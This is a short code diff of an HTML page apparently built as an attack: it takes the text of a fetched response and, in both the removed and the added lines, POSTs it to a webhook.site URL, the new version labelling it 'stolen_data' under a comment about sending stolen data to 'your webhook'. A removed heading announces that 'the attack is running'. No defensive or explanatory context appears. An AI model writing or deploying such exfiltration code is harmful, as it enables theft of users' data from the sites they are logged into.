@@ -7,13 +7,11 @@
       })
       .then(res => res.text())
       .then(data => {
-        fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
-          method: "POST",
-          body: data,
-          headers: { "Content-Type": "text/plain" }
-        });
-      });
-    </script>
-    <h1>If you see this, the attack is running...</h1>
-  </body>
-</html>
+  // Send the stolen data to your webhook
+  fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
+    method: "POST",
+    body: JSON.stringify({ stolen_data: data }),
+    headers: { "Content-Type": "application/json" }
+  });
+});
+</script>
